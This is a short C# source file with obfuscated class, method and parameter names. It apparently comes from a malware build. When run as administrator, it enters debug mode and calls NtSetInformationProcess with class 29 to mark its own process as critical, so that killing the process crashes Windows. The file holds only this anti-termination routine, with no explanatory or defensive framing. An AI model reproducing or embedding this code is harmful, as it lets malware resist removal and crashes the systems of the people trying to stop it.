using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace YXHSMjloYIX;

public static class IhAexOOVYrys
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr NzWLQmoFPNWdYBe, int UebpnwtrMuWidVFy, ref int KIgYxxCpCtTarU, int rHKcDzcVnOwX);

	public static void cOeOXZSCydc()
	{
		if (FDCIZfyOdyJOqm())
		{
			fTBRSnfvCNH();
		}
	}

	public static void fTBRSnfvCNH()
	{
		int KIgYxxCpCtTarU = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref KIgYxxCpCtTarU, 4);
	}

	public static bool FDCIZfyOdyJOqm()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
